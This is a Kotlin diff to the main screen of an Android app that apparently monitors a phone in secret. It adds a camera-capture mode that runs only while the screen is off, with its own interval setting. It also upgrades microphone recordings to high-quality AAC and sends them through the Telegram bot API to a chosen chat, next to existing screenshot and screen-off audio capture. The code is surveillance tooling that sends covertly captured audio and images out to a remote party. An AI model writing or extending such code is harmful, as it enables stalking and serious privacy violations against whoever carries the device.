@@ -37,6 +37,8 @@ class MainActivity : AppCompatActivity() {
     private lateinit var audioSwitch: Switch
     private lateinit var audioDurationEdit: EditText
     private lateinit var screenOffOnlySwitch: Switch
+    private lateinit var cameraScreenOffSwitch: Switch
+    private lateinit var cameraIntervalEdit: EditText
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -52,11 +54,19 @@ class MainActivity : AppCompatActivity() {
         audioSwitch = findViewById(R.id.audioSwitch)
         audioDurationEdit = findViewById(R.id.audioDurationEdit)
         screenOffOnlySwitch = findViewById(R.id.screenOffOnlySwitch)
+        cameraScreenOffSwitch = findViewById(R.id.cameraScreenOffSwitch)
+        cameraIntervalEdit = findViewById(R.id.cameraIntervalEdit)
         
         audioSwitch.setOnCheckedChangeListener { _, isChecked ->
             val visibility = if (isChecked) View.VISIBLE else View.GONE
             audioDurationEdit.visibility = visibility
             screenOffOnlySwitch.visibility = visibility
+        }
+
+        cameraSwitch.setOnCheckedChangeListener { _, isChecked ->
+             val visibility = if (isChecked) View.VISIBLE else View.GONE
+             cameraScreenOffSwitch.visibility = visibility
+             cameraIntervalEdit.visibility = visibility
         }
 
         // ... (reuse screenshotButton logic) ...
@@ -134,15 +144,17 @@ class MainActivity : AppCompatActivity() {
                 }
                 
                 var mr: android.media.MediaRecorder? = null
-                val file = java.io.File(cacheDir, "test_audio.3gp") 
+                val file = java.io.File(cacheDir, "test_audio.m4a") 
                 
                 try {
                     mr = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) android.media.MediaRecorder(this@MainActivity) else android.media.MediaRecorder()
                     
                     mr.apply {
                         setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
-                        setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP) 
-                        setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB)     
+                        setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4) 
+                        setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
+                        setAudioEncodingBitRate(128000)
+                        setAudioSamplingRate(44100)
                         setOutputFile(file.absolutePath)
                         prepare()
                         start()
@@ -155,8 +167,8 @@ class MainActivity : AppCompatActivity() {
                     mr = null
                     
                     withContext(Dispatchers.Main) { 
-                        testAudioBtn.text = "Sending..."
-                        Toast.makeText(this@MainActivity, "Sending...", Toast.LENGTH_SHORT).show() 
+                        testAudioBtn.text = "Sending HQ..."
+                        Toast.makeText(this@MainActivity, "Sending HQ Audio...", Toast.LENGTH_SHORT).show() 
                     }
                     
                     val client = OkHttpClient()
@@ -164,8 +176,8 @@ class MainActivity : AppCompatActivity() {
                     val requestBody = okhttp3.MultipartBody.Builder()
                         .setType(okhttp3.MultipartBody.FORM)
                         .addFormDataPart("chat_id", chatId)
-                        .addFormDataPart("audio", "test.3gp",
-                            file.readBytes().toRequestBody("audio/3gpp".toMediaTypeOrNull(), 0, file.length().toInt()))
+                        .addFormDataPart("audio", "test.m4a",
+                            file.readBytes().toRequestBody("audio/m4a".toMediaTypeOrNull(), 0, file.length().toInt()))
                         .build()
                     val request = Request.Builder().url(url).post(requestBody).build()
                     
@@ -203,6 +215,9 @@ class MainActivity : AppCompatActivity() {
             val audioDurationStr = audioDurationEdit.text.toString().trim()
             val audioDuration = audioDurationStr.toLongOrNull() ?: 60L
             val audioScreenOff = screenOffOnlySwitch.isChecked
+            val cameraScreenOff = cameraScreenOffSwitch.isChecked
+            val cameraIntervalStr = cameraIntervalEdit.text.toString().trim()
+            val cameraInterval = cameraIntervalStr.toLongOrNull() ?: 10L
 
             if (interval < 5) {
                  Toast.makeText(this, "Screenshot Interval must be at least 5 seconds", Toast.LENGTH_SHORT).show()
@@ -231,7 +246,7 @@ class MainActivity : AppCompatActivity() {
                 return@setOnClickListener
             }
 
-            saveValues(token, chatId, sendCamera, interval, sendAudio, audioDuration, audioScreenOff)
+            saveValues(token, chatId, sendCamera, interval, sendAudio, audioDuration, audioScreenOff, cameraScreenOff, cameraInterval)
             
             // Start Independent Monitor Service (Audio/Camera)
             val monitorIntent = Intent(this, MonitorService::class.java)
@@ -353,6 +368,15 @@ class MainActivity : AppCompatActivity() {
         botTokenEdit.setText(pref.getString("token", ""))
         chatIdEdit.setText(pref.getString("chatId", ""))
         cameraSwitch.isChecked = pref.getBoolean("sendCamera", false)
+        
+        cameraScreenOffSwitch.isChecked = pref.getBoolean("cameraScreenOff", false)
+        val cameraInterval = pref.getLong("cameraInterval", 10L)
+        cameraIntervalEdit.setText(cameraInterval.toString())
+        
+        val camVisibility = if (cameraSwitch.isChecked) View.VISIBLE else View.GONE
+        cameraScreenOffSwitch.visibility = camVisibility
+        cameraIntervalEdit.visibility = camVisibility
+
         val interval = pref.getLong("screenshotInterval", 10L)
         screenshotIntervalEdit.setText(interval.toString())
         
@@ -366,7 +390,7 @@ class MainActivity : AppCompatActivity() {
         screenOffOnlySwitch.visibility = visibility
     }
 
-    private fun saveValues(token: String, chatId: String, sendCamera: Boolean, interval: Long, sendAudio: Boolean, audioDuration: Long, audioScreenOff: Boolean) {
+    private fun saveValues(token: String, chatId: String, sendCamera: Boolean, interval: Long, sendAudio: Boolean, audioDuration: Long, audioScreenOff: Boolean, cameraScreenOff: Boolean, cameraInterval: Long) {
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
         pref.edit().putString("token", token)
             .putString("chatId", chatId)
@@ -375,6 +399,8 @@ class MainActivity : AppCompatActivity() {
             .putBoolean("sendAudio", sendAudio)
             .putLong("audioDuration", audioDuration)
             .putBoolean("audioScreenOff", audioScreenOff)
+            .putBoolean("cameraScreenOff", cameraScreenOff)
+            .putLong("cameraInterval", cameraInterval)
             .apply()
     }
 }
